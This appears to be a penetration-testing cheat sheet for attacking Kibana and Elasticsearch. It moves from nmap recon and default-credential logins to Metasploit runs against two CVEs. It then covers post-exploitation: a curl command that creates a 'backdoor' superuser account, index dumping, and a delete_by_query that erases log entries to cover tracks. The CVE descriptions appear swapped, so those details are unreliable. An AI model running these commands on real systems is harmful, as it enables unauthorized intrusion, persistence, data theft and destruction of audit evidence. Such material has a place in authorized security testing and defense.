# Kibana

**`Default Port: 5601`**

**Kibana** is an open-source data visualization and exploration tool used for log and time-series analytics. It provides powerful and beautiful dashboards for real-time visualization of data in Elasticsearch.

### Connect <a href="#connect" id="connect"></a>

#### Accessing Kibana <a href="#accessing-kibana" id="accessing-kibana"></a>

To interact with Kibana, you will typically use a web browser to connect to its web interface. The default port for Kibana is 5601.

```
http://<target-ip>:5601
```

### Recon <a href="#recon" id="recon"></a>

#### Detecting Kibana Service <a href="#detecting-kibana-service" id="detecting-kibana-service"></a>

Nmap can be used to detect whether the Kibana service is running on a target machine.

```
nmap -p5601 <target-ip>
```

Additionally, you can use a service detection script for more detailed information.

```
nmap --script http-kibana-detect -p 5601 <target-ip>
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Enumerating Kibana Version <a href="#enumerating-kibana-version" id="enumerating-kibana-version"></a>

Knowing the version of Kibana running on the target can help identify known vulnerabilities specific to that version. You can usually find the version information on the login page or the about page.

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

Often, Kibana installations may have default credentials that haven’t been changed. Attempt to log in using:

* Username: elastic
* Password: changeme

```
curl -XPOST -u elastic:changeme http://<target-ip>:5601/api/security/v1/login
```

#### Kibana File Read Vulnerability (CVE-2019-7609) <a href="#kibana-file-read-vulnerability-cve-2019-7609" id="kibana-file-read-vulnerability-cve-2019-7609"></a>

This exploit allows an attacker to read arbitrary files on the Kibana server. Metasploit has a module for this exploit:

```
msfconsole
use exploit/linux/http/kibana_lfr
set RHOST <target-ip>
set RPORT 5601
exploit
```

#### Remote Code Execution via Kibana Timelion (CVE-2018-17246) <a href="#remote-code-execution-via-kibana-timelion-cve-2018-17246" id="remote-code-execution-via-kibana-timelion-cve-2018-17246"></a>

This utilized a vulnerability in the Timelion feature to achieve RCE.

```
msfconsole
use exploit/multi/http/kibana_timelion_rce
set RHOST <target-ip>
set RPORT 5601
exploit
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Maintaing Access <a href="#maintaing-access" id="maintaing-access"></a>

Create an administrative backdoor account if you have gathered credentials or achieved code execution.

```
curl -XPOST -u <privileged-user>:<password> http://<target-ip>:5601/api/security/v1/users -H 'Content-Type: application/json' -d '{
  "username" : "backdoor",
  "password" : "password",
  "roles" : [ "superuser" ]
}'
```

#### Dumping Data <a href="#dumping-data" id="dumping-data"></a>

Based on what Elasticsearch is logging, you can extract a lot from Kibana.

```
curl -XGET 'http://<target-ip>:9200/_cat/indices?v&pretty'
curl -XGET 'http://<target-ip>:9200/<index>/_search?pretty'
```

#### Cleaning Logs <a href="#cleaning-logs" id="cleaning-logs"></a>

If you have write permissions, you can manipulate or delete logs to cover your tracks.

```
curl -X POST "http://<target-ip>:9200/<index>/_delete_by_query" -H 'Content-Type: application/json' -d'
{
  "query": {
    "match": {
      "message": "suspicious activity message"
    }
  }
}'
``
```

<br>
